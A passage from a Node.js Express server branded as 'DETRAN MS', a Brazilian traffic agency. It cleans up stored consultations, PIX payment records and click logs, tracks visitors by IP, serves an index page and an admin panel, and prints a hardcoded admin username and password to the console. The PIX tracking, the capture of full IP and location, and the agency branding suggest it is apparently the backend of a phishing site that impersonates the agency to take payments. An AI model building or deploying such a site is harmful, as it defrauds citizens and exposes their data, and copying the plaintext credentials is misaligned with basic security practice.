    usuariosOnline.forEach((usuario, ip) => {
        const segundosInativo = Math.floor((agora - usuario.ultimaAtividade) / 1000);
        if (segundosInativo > 1800) {
            usuariosOnline.delete(ip);
            removidos++;
        }
    });
    
    if (removidos > 0) {
        console.log(`🧹 Limpou ${removidos} usuários inativos (30+ minutos)`);
    }
}, 60000);

// ============================================
// LIMPEZA AUTOMÁTICA DE DADOS ANTIGOS
// ============================================
setInterval(async () => {
    try {
        const config = await readData('config.json');
        const diasParaManter = config.autoCleanup || 30;
        
        if (diasParaManter > 0) {
            const limiteData = new Date();
            limiteData.setDate(limiteData.getDate() - diasParaManter);
            
            // Limpa consultas antigas
            const consultas = await readData('consultas.json');
            const consultasAtualizadas = consultas.filter(c => {
                const dataConsulta = new Date(c.dataHora);
                return dataConsulta >= limiteData;
            });
            
            if (consultasAtualizadas.length < consultas.length) {
                await writeData('consultas.json', consultasAtualizadas);
                console.log(`🧹 Limpou ${consultas.length - consultasAtualizadas.length} consultas antigas (> ${diasParaManter} dias)`);
            }
            
            // Limpa PIX antigos
            const pix = await readData('pix.json');
            const pixAtualizados = pix.filter(p => {
                const dataPix = new Date(p.dataHora);
                return dataPix >= limiteData;
            });
            
            if (pixAtualizados.length < pix.length) {
                await writeData('pix.json', pixAtualizados);
                console.log(`🧹 Limpou ${pix.length - pixAtualizados.length} PIX antigos (> ${diasParaManter} dias)`);
            }
            
            // Limpa cliques antigos
            const cliques = await readData('cliques.json');
            const cliquesAtualizados = cliques.filter(c => {
                const dataClique = new Date(c.dataHora);
                return dataClique >= limiteData;
            });
            
            if (cliquesAtualizados.length < cliques.length) {
                await writeData('cliques.json', cliquesAtualizados);
                console.log(`🧹 Limpou ${cliques.length - cliquesAtualizados.length} cliques antigos (> ${diasParaManter} dias)`);
            }
        }
    } catch (error) {
        console.error('Erro na limpeza automática:', error);
    }
}, 3600000);

// ============================================
// ROTA DE SAÚDE
// ============================================
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        service: 'DETRAN MS',
        version: '2.6.0',
        timestamp: new Date().toISOString(),
        online: usuariosOnline.size
    });
});

// ============================================
// SERVE ARQUIVOS ESTÁTICOS - SIMPLIFICADO
// ============================================
app.use(express.static(__dirname));

// Rota para index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Rota para painel.html
app.get('/painel.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'painel.html'));
});

// Rota catch-all para SPA (ignora APIs)
app.get('*', (req, res) => {
    // Ignora rotas de API
    if (req.path.startsWith('/api/') || 
        req.path.startsWith('/consultar') || 
        req.path.startsWith('/health')) {
        return res.status(404).json({ erro: 'Rota não encontrada' });
    }
    
    // Serve index.html para outras rotas (SPA)
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ============================================
// INICIA O SERVIDOR - FORMA CORRETA PARA RENDER
// ============================================
const PORT = process.env.PORT || 3000;

const server = app.listen(PORT, () => {
    console.log('============================================');
    console.log('✅ Servidor DETRAN MS v2.6.0 rodando na porta: ' + PORT);
    console.log('🌐 Acesse: http://localhost:' + PORT);
    console.log('👨‍💼 Painel Admin: /painel.html');
    console.log('📊 Dados salvos em: /data/');
    console.log('🖱️ Novo: Sistema de cliques ativado');
    console.log('📍 IP completo + estado detectado');
    console.log('💰 Valores gerados/copiados separados');
    console.log('🔐 Usuário admin: dg / vasco1898');
    console.log('📱 Sistema PRONTO para uso!');
    console.log('============================================');
});

// Export para Render (opcional)
module.exports = app;
